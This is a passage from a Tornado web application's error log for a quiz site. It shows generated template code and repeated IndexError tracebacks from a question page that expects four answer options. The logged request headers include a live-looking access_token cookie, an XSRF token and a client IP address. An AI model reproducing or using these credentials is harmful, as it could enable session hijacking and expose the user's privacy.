50      _append(_tmp)  # test/test.html:6 (via base.html:88)
51      _append('\n</div>\n')  # test/test.html:8 (via base.html:88)
52      _append('\n')  # base.html:92
53      _tmp = xsrf_form_html()  # base.html:92
54      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:92
55      else: _tmp = _utf8(str(_tmp))  # base.html:92
56      _append(_tmp)  # base.html:92
57      _append('\n')  # base.html:93
58      _append('\n<script src="')  # base.html:94 (via base.html:93)
59      _tmp = static_url('js/libs/jquery-1.7.2.min.js')  # base.html:94 (via base.html:93)
60      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:94 (via base.html:93)
61      else: _tmp = _utf8(str(_tmp))  # base.html:94 (via base.html:93)
62      _tmp = _utf8(xhtml_escape(_tmp))  # base.html:94 (via base.html:93)
63      _append(_tmp)  # base.html:94 (via base.html:93)
64      _append('"></script>\n<script src="')  # base.html:95 (via base.html:93)
65      _tmp = static_url('js/libs/blurb.min.js')  # base.html:95 (via base.html:93)
66      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:95 (via base.html:93)
67      else: _tmp = _utf8(str(_tmp))  # base.html:95 (via base.html:93)
68      _tmp = _utf8(xhtml_escape(_tmp))  # base.html:95 (via base.html:93)
69      _append(_tmp)  # base.html:95 (via base.html:93)
70      _append('"></script>\n<script src="')  # base.html:96 (via base.html:93)
71      _tmp = static_url('js/IT.js')  # base.html:96 (via base.html:93)
72      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:96 (via base.html:93)
73      else: _tmp = _utf8(str(_tmp))  # base.html:96 (via base.html:93)
74      _tmp = _utf8(xhtml_escape(_tmp))  # base.html:96 (via base.html:93)
75      _append(_tmp)  # base.html:96 (via base.html:93)
76      _append('"></script>\n<script type="text/javascript" src="http://twitter.github.com/bootstrap/assets/js/bootstrap-dropdown.js"></script>\n<script type="text/javascript" src="http://twitter.github.com/bootstrap/assets/js/bootstrap-button.js"></script>\n<script type="text/javascript" src="http://twitter.github.com/bootstrap/assets/js/bootstrap-modal.js"></script>\n')  # base.html:100 (via base.html:93)
77      _append('\n')  # base.html:102
78      for js in kwargs['js_deps']:  # base.html:102
79          _append('\n<script src="')  # base.html:103
80          _tmp = static_url(js)  # base.html:103
81          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:103
82          else: _tmp = _utf8(str(_tmp))  # base.html:103
83          _tmp = _utf8(xhtml_escape(_tmp))  # base.html:103
84          _append(_tmp)  # base.html:103
85          _append('"></script>\n')  # base.html:104
86      _append('\n')  # base.html:106
87      _append('\n')  # test/test.html:11 (via base.html:106)
88      _append('\n<div class="container">\n<div class="footer"><font color="#FFFFFF" size="2px"> <p class="alignleft">InTheory Media Limited \xc2\xa9 2012</p>\n<p class="alignright">About Us | Terms & Conditions | Privacy Policy | Support </p></font></br>\n</div>\n</div>\n</body>\n</html>\n')  # base.html:118
89      return _utf8('').join(_buffer)  # base.html:0
ERROR:root:ui-modules/question.html code:
  1  def _execute():  # ui-modules/question.html:0
  2      _buffer = []  # ui-modules/question.html:0
  3      _append = _buffer.append  # ui-modules/question.html:0
  4      _append('<div class="hero-unit">\n<div class="hero-unit1">\n')  # ui-modules/question.html:4
  5      question = test.questions[test.cursor]  # ui-modules/question.html:4
  6      _append('\n<div class="image123"><img alt="" src="')  # ui-modules/question.html:5
  7      _tmp = static_url('imgs/questionbg.png')  # ui-modules/question.html:5
  8      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:5
  9      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:5
 10      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:5
 11      _append(_tmp)  # ui-modules/question.html:5
 12      _append('" />\n<div class="text">\n<div class="verticalalign" style="display: table; height: 100px; #position: relative; overflow: hidden;">\n<div style=" #position: absolute; #top: 50%;display: table-cell; vertical-align: middle;">\n<div class="greenBorder" style=" #position: relative; #top: -50%">\n<p><font color="#FFFFFF"><b>')  # ui-modules/question.html:11
 13      _tmp = question.question  # ui-modules/question.html:11
 14      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:11
 15      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:11
 16      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:11
 17      _append(_tmp)  # ui-modules/question.html:11
 18      _append('</b></font></p>\n</div>\n</div>\n</div>\n</div>\n</div>\n</br></br></br></br></br>\n<div class="progress progress-striped">\n<div class="bar bar-success progress-striped" style="width: ')  # ui-modules/question.html:19
 19      _tmp = 100*test.cursor/len(test.questions)  # ui-modules/question.html:19
 20      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:19
 21      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:19
 22      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:19
 23      _append(_tmp)  # ui-modules/question.html:19
 24      _append('%">\n</div>\n</div>\n')  # ui-modules/question.html:22
 25      if not question.image:  # ui-modules/question.html:22
 26          _append('\n<table class="table table-hover">\n<thead>\n<tr>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><center><center><span class="badge badge-info">A</span></center></td>\n<td class="choice first">')  # ui-modules/question.html:32
 27          _tmp = question.options[0]  # ui-modules/question.html:32
 28          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:32
 29          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:32
 30          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:32
 31          _append(_tmp)  # ui-modules/question.html:32
 32          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">B</span></center></td>\n<td class="choice second">')  # ui-modules/question.html:36
 33          _tmp = question.options[1]  # ui-modules/question.html:36
 34          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:36
 35          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:36
 36          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:36
 37          _append(_tmp)  # ui-modules/question.html:36
 38          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">C</span></center></td>\n<td class="choice third">')  # ui-modules/question.html:40
 39          _tmp = question.options[2]  # ui-modules/question.html:40
 40          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:40
 41          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:40
 42          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:40
 43          _append(_tmp)  # ui-modules/question.html:40
 44          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">D</span></center></td>\n<td class="choice fourth">')  # ui-modules/question.html:44
 45          _tmp = question.options[3]  # ui-modules/question.html:44
 46          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:44
 47          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:44
 48          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:44
 49          _append(_tmp)  # ui-modules/question.html:44
 50          _append('</td>\n</tr>\n</tbody>\n</table>\n')  # ui-modules/question.html:48
 51      else:  # ui-modules/question.html:48
 52          _append('\n<div id="left">\n<div id="object1">\n<table class="table table-hover">\n<thead>\n<tr>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style="width: 5%; padding-top: 13px;"><center><center><span class="badge badge-info">A</span></center></td>\n<td class="choice first" style="width: 40%; padding-top: 14px;">')  # ui-modules/question.html:61
 53          _tmp = question.options[0]  # ui-modules/question.html:61
 54          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:61
 55          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:61
 56          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:61
 57          _append(_tmp)  # ui-modules/question.html:61
 58          _append('\n</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">B</span></center></td>\n<td class="choice second" style="padding-top: 14px;">')  # ui-modules/question.html:66
 59          _tmp = question.options[1]  # ui-modules/question.html:66
 60          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:66
 61          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:66
 62          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:66
 63          _append(_tmp)  # ui-modules/question.html:66
 64          _append('</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">C</span></center></td>\n<td class="choice third" style="padding-top: 14px;">')  # ui-modules/question.html:70
 65          _tmp = question.options[2]  # ui-modules/question.html:70
 66          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:70
 67          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:70
 68          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:70
 69          _append(_tmp)  # ui-modules/question.html:70
 70          _append('</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">D</span></center></td>\n<td class="choice fourth" style="padding-top: 14px;">')  # ui-modules/question.html:74
 71          _tmp = question.options[3]  # ui-modules/question.html:74
 72          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:74
 73          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:74
 74          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:74
 75          _append(_tmp)  # ui-modules/question.html:74
 76          _append('</td>\n</tbody>\n</table>\n</div>\n</div>\n<div id="right">\n<div id="object3"><img src="/static/imgs/')  # ui-modules/question.html:81
 77          _tmp = question.image  # ui-modules/question.html:81
 78          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:81
 79          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:81
 80          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:81
 81          _append(_tmp)  # ui-modules/question.html:81
 82          _append('" alt="some_text"/></div>\n</div>\n')  # ui-modules/question.html:83
 83      _append('\n<ul class="pager">\n<li class="previous">\n<a href="#">&larr; Previous</a>\n</li>\n<li class="next" cursor="')  # ui-modules/question.html:89
 84      _tmp = test.cursor  # ui-modules/question.html:89
 85      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 86      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 87      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
 88      _append(_tmp)  # ui-modules/question.html:89
 89      _append('" tid="')  # ui-modules/question.html:89
 90      _tmp = test.id  # ui-modules/question.html:89
 91      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 92      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 93      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
 94      _append(_tmp)  # ui-modules/question.html:89
 95      _append('" remaining-answers="')  # ui-modules/question.html:89
 96      _tmp = len(question.answer)  # ui-modules/question.html:89
 97      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 98      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 99      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
100      _append(_tmp)  # ui-modules/question.html:89
101      _append('">\n<a href="#">Next &rarr;</a>\n</li>\n</ul>\n</div>\n</div>\n')  # ui-modules/question.html:100
102      return _utf8('').join(_buffer)  # ui-modules/question.html:0
ERROR:root:Uncaught exception POST /test/evaluate (127.0.0.1)
HTTPRequest(protocol='http', host='www.intheory.co.uk', method='POST', uri='/test/evaluate', version='HTTP/1.0', remote_ip='127.0.0.1', body='tid=505b761b8e4c85480ff4f8cb&answers=%5B0%5D&cursor=0&_xsrf=a72480ac9f38491c987036314331c9cd', headers={'Origin': 'http://www.intheory.co.uk', 'Content-Length': '92', 'Accept-Language': 'en-US,en;q=0.8', 'Accept-Encoding': 'gzip,deflate,sdch', 'X-Scheme': 'http', 'Host': 'www.intheory.co.uk', 'Accept': '*/*', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.89 Safari/537.1', 'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.3', 'Connection': 'close', 'X-Requested-With': 'XMLHttpRequest', 'Referer': 'http://www.intheory.co.uk/test/new', 'X-Real-Ip': '81.157.50.23', 'Cookie': '_xsrf=a72480ac9f38491c987036314331c9cd; access_token="QUFBRzZsTmNzNkdjQkFKc3JoeDR1MldtTVpDYjdDWkF0bDUwY1h5QXo0eWVVc1pCNG9wT3VnNmVpaVdScW5KcTZndEZoQkJiZ2JqZkdEWWYxbHlJbTkyZVFPN0ZQY2txemhRS0hDVXJEd1pEWkQ=|1348171239|39abdb21e6e442130e704c9fc2cf37a9e637d8da"; __utma=188782963.286415293.1347962953.1347962953.1348171171.2; __utmb=188782963.5.10.1348171171; __utmc=188782963; __utmz=188782963.1347962953.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none)', 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'})
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 1021, in _execute
    getattr(self, self.request.method.lower())(*args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 102, in post
    self._execute_request(self.on_post, *args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 221, in _execute_request
    self._execute_on_success(*result)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 226, in _execute_on_success
    self.on_success(*result)
  File "/www/virtualenv/intheory/src/app/handlers/test.py", line 58, in on_success
    self.xhr_response.update({"html": self.render_string("ui-modules/question.html", test=mt)})
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 615, in render_string
    return t.generate(**args)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/template.py", line 254, in generate
    return execute()
  File "ui-modules/question_html.generated.py", line 45, in _execute
    _tmp = question.options[3]  # ui-modules/question.html:44
IndexError: list index out of range
ERROR:root:500 POST /test/evaluate (127.0.0.1) 90.20ms
ERROR:root:ui-modules/question.html code:
  1  def _execute():  # ui-modules/question.html:0
  2      _buffer = []  # ui-modules/question.html:0
  3      _append = _buffer.append  # ui-modules/question.html:0
  4      _append('<div class="hero-unit">\n<div class="hero-unit1">\n')  # ui-modules/question.html:4
  5      question = test.questions[test.cursor]  # ui-modules/question.html:4
  6      _append('\n<div class="image123"><img alt="" src="')  # ui-modules/question.html:5
  7      _tmp = static_url('imgs/questionbg.png')  # ui-modules/question.html:5
  8      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:5
  9      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:5
 10      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:5
 11      _append(_tmp)  # ui-modules/question.html:5
 12      _append('" />\n<div class="text">\n<div class="verticalalign" style="display: table; height: 100px; #position: relative; overflow: hidden;">\n<div style=" #position: absolute; #top: 50%;display: table-cell; vertical-align: middle;">\n<div class="greenBorder" style=" #position: relative; #top: -50%">\n<p><font color="#FFFFFF"><b>')  # ui-modules/question.html:11
 13      _tmp = question.question  # ui-modules/question.html:11
 14      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:11
 15      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:11
 16      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:11
 17      _append(_tmp)  # ui-modules/question.html:11
 18      _append('</b></font></p>\n</div>\n</div>\n</div>\n</div>\n</div>\n</br></br></br></br></br>\n<div class="progress progress-striped">\n<div class="bar bar-success progress-striped" style="width: ')  # ui-modules/question.html:19
 19      _tmp = 100*test.cursor/len(test.questions)  # ui-modules/question.html:19
 20      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:19
 21      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:19
 22      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:19
 23      _append(_tmp)  # ui-modules/question.html:19
 24      _append('%">\n</div>\n</div>\n')  # ui-modules/question.html:22
 25      if not question.image:  # ui-modules/question.html:22
 26          _append('\n<table class="table table-hover">\n<thead>\n<tr>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><center><center><span class="badge badge-info">A</span></center></td>\n<td class="choice first">')  # ui-modules/question.html:32
 27          _tmp = question.options[0]  # ui-modules/question.html:32
 28          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:32
 29          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:32
 30          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:32
 31          _append(_tmp)  # ui-modules/question.html:32
 32          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">B</span></center></td>\n<td class="choice second">')  # ui-modules/question.html:36
 33          _tmp = question.options[1]  # ui-modules/question.html:36
 34          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:36
 35          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:36
 36          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:36
 37          _append(_tmp)  # ui-modules/question.html:36
 38          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">C</span></center></td>\n<td class="choice third">')  # ui-modules/question.html:40
 39          _tmp = question.options[2]  # ui-modules/question.html:40
 40          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:40
 41          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:40
 42          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:40
 43          _append(_tmp)  # ui-modules/question.html:40
 44          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">D</span></center></td>\n<td class="choice fourth">')  # ui-modules/question.html:44
 45          _tmp = question.options[3]  # ui-modules/question.html:44
 46          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:44
 47          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:44
 48          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:44
 49          _append(_tmp)  # ui-modules/question.html:44
 50          _append('</td>\n</tr>\n</tbody>\n</table>\n')  # ui-modules/question.html:48
 51      else:  # ui-modules/question.html:48
 52          _append('\n<div id="left">\n<div id="object1">\n<table class="table table-hover">\n<thead>\n<tr>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style="width: 5%; padding-top: 13px;"><center><center><span class="badge badge-info">A</span></center></td>\n<td class="choice first" style="width: 40%; padding-top: 14px;">')  # ui-modules/question.html:61
 53          _tmp = question.options[0]  # ui-modules/question.html:61
 54          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:61
 55          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:61
 56          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:61
 57          _append(_tmp)  # ui-modules/question.html:61
 58          _append('\n</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">B</span></center></td>\n<td class="choice second" style="padding-top: 14px;">')  # ui-modules/question.html:66
 59          _tmp = question.options[1]  # ui-modules/question.html:66
 60          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:66
 61          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:66
 62          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:66
 63          _append(_tmp)  # ui-modules/question.html:66
 64          _append('</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">C</span></center></td>\n<td class="choice third" style="padding-top: 14px;">')  # ui-modules/question.html:70
 65          _tmp = question.options[2]  # ui-modules/question.html:70
 66          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:70
 67          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:70
 68          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:70
 69          _append(_tmp)  # ui-modules/question.html:70
 70          _append('</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">D</span></center></td>\n<td class="choice fourth" style="padding-top: 14px;">')  # ui-modules/question.html:74
 71          _tmp = question.options[3]  # ui-modules/question.html:74
 72          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:74
 73          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:74
 74          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:74
 75          _append(_tmp)  # ui-modules/question.html:74
 76          _append('</td>\n</tbody>\n</table>\n</div>\n</div>\n<div id="right">\n<div id="object3"><img src="/static/imgs/')  # ui-modules/question.html:81
 77          _tmp = question.image  # ui-modules/question.html:81
 78          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:81
 79          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:81
 80          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:81
 81          _append(_tmp)  # ui-modules/question.html:81
 82          _append('" alt="some_text"/></div>\n</div>\n')  # ui-modules/question.html:83
 83      _append('\n<ul class="pager">\n<li class="previous">\n<a href="#">&larr; Previous</a>\n</li>\n<li class="next" cursor="')  # ui-modules/question.html:89
 84      _tmp = test.cursor  # ui-modules/question.html:89
 85      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 86      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 87      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
 88      _append(_tmp)  # ui-modules/question.html:89
 89      _append('" tid="')  # ui-modules/question.html:89
 90      _tmp = test.id  # ui-modules/question.html:89
 91      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 92      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 93      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
 94      _append(_tmp)  # ui-modules/question.html:89
 95      _append('" remaining-answers="')  # ui-modules/question.html:89
 96      _tmp = len(question.answer)  # ui-modules/question.html:89
 97      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 98      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 99      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
100      _append(_tmp)  # ui-modules/question.html:89
101      _append('">\n<a href="#">Next &rarr;</a>\n</li>\n</ul>\n</div>\n</div>\n')  # ui-modules/question.html:100
102      return _utf8('').join(_buffer)  # ui-modules/question.html:0
ERROR:root:Uncaught exception POST /test/evaluate (127.0.0.1)
HTTPRequest(protocol='http', host='www.intheory.co.uk', method='POST', uri='/test/evaluate', version='HTTP/1.0', remote_ip='127.0.0.1', body='tid=505b761b8e4c85480ff4f8cb&answers=%5B3%5D&cursor=5&_xsrf=a72480ac9f38491c987036314331c9cd', headers={'Origin': 'http://www.intheory.co.uk', 'Content-Length': '92', 'Accept-Language': 'en-US,en;q=0.8', 'Accept-Encoding': 'gzip,deflate,sdch', 'X-Scheme': 'http', 'Host': 'www.intheory.co.uk', 'Accept': '*/*', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.89 Safari/537.1', 'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.3', 'Connection': 'close', 'X-Requested-With': 'XMLHttpRequest', 'Referer': 'http://www.intheory.co.uk/test/new', 'X-Real-Ip': '81.157.50.23', 'Cookie': '_xsrf=a72480ac9f38491c987036314331c9cd; access_token="QUFBRzZsTmNzNkdjQkFKc3JoeDR1MldtTVpDYjdDWkF0bDUwY1h5QXo0eWVVc1pCNG9wT3VnNmVpaVdScW5KcTZndEZoQkJiZ2JqZkdEWWYxbHlJbTkyZVFPN0ZQY2txemhRS0hDVXJEd1pEWkQ=|1348171239|39abdb21e6e442130e704c9fc2cf37a9e637d8da"; __utma=188782963.286415293.1347962953.1347962953.1348171171.2; __utmb=188782963.5.10.1348171171; __utmc=188782963; __utmz=188782963.1347962953.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none)', 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'})
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 1021, in _execute
    getattr(self, self.request.method.lower())(*args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 102, in post
    self._execute_request(self.on_post, *args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 221, in _execute_request
    self._execute_on_success(*result)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 226, in _execute_on_success
    self.on_success(*result)
  File "/www/virtualenv/intheory/src/app/handlers/test.py", line 58, in on_success
    self.xhr_response.update({"html": self.render_string("ui-modules/question.html", test=mt)})
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 615, in render_string
    return t.generate(**args)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/template.py", line 254, in generate
    return execute()
  File "ui-modules/question_html.generated.py", line 45, in _execute
    _tmp = question.options[3]  # ui-modules/question.html:44
IndexError: list index out of range
ERROR:root:500 POST /test/evaluate (127.0.0.1) 95.10ms
ERROR:root:ui-modules/question.html code:
  1  def _execute():  # ui-modules/question.html:0
  2      _buffer = []  # ui-modules/question.html:0
  3      _append = _buffer.append  # ui-modules/question.html:0
  4      _append('<div class="hero-unit">\n<div class="hero-unit1">\n')  # ui-modules/question.html:4
  5      question = test.questions[test.cursor]  # ui-modules/question.html:4
  6      _append('\n<div class="image123"><img alt="" src="')  # ui-modules/question.html:5
  7      _tmp = static_url('imgs/questionbg.png')  # ui-modules/question.html:5
  8      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:5
  9      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:5
 10      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:5
 11      _append(_tmp)  # ui-modules/question.html:5
 12      _append('" />\n<div class="text">\n<div class="verticalalign" style="display: table; height: 100px; #position: relative; overflow: hidden;">\n<div style=" #position: absolute; #top: 50%;display: table-cell; vertical-align: middle;">\n<div class="greenBorder" style=" #position: relative; #top: -50%">\n<p><font color="#FFFFFF"><b>')  # ui-modules/question.html:11
 13      _tmp = question.question  # ui-modules/question.html:11
 14      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:11
 15      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:11
 16      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:11
 17      _append(_tmp)  # ui-modules/question.html:11
 18      _append('</b></font></p>\n</div>\n</div>\n</div>\n</div>\n</div>\n</br></br></br></br></br>\n<div class="progress progress-striped">\n<div class="bar bar-success progress-striped" style="width: ')  # ui-modules/question.html:19
 19      _tmp = 100*test.cursor/len(test.questions)  # ui-modules/question.html:19
 20      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:19
 21      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:19
 22      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:19
 23      _append(_tmp)  # ui-modules/question.html:19
 24      _append('%">\n</div>\n</div>\n')  # ui-modules/question.html:22
 25      if not question.image:  # ui-modules/question.html:22
 26          _append('\n<table class="table table-hover">\n<thead>\n<tr>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><center><center><span class="badge badge-info">A</span></center></td>\n<td class="choice first">')  # ui-modules/question.html:32
 27          _tmp = question.options[0]  # ui-modules/question.html:32
 28          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:32
 29          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:32
 30          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:32
 31          _append(_tmp)  # ui-modules/question.html:32
 32          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">B</span></center></td>\n<td class="choice second">')  # ui-modules/question.html:36
 33          _tmp = question.options[1]  # ui-modules/question.html:36
 34          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:36
 35          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:36
 36          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:36
 37          _append(_tmp)  # ui-modules/question.html:36
 38          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">C</span></center></td>\n<td class="choice third">')  # ui-modules/question.html:40
 39          _tmp = question.options[2]  # ui-modules/question.html:40
 40          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:40
 41          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:40
 42          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:40
 43          _append(_tmp)  # ui-modules/question.html:40
 44          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">D</span></center></td>\n<td class="choice fourth">')  # ui-modules/question.html:44
 45          _tmp = question.options[3]  # ui-modules/question.html:44
 46          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:44
